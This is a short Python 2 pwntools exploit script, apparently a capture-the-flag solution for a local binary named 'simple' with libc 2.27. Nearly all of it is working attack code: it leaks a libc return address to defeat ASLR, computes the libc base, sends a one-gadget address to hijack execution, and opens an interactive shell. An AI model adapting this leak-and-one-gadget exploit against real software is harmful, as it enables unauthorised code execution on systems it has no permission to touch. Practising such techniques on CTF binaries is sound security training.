#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./simple
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./simple')
libc = ELF("./libc-2.27.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
entry-break
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.recvline()
io.sendline("19")
ret = io.recvline().strip()
ret = int(ret, 16)
libc.address = ret - 231 - libc.symbols.__libc_start_main
io.sendline()
io.recvline()
io.sendline("19")
io.recvline()
io.sendline(p64(libc.address + 0x4f322))
io.recvline()
io.sendline("-1")

io.interactive()
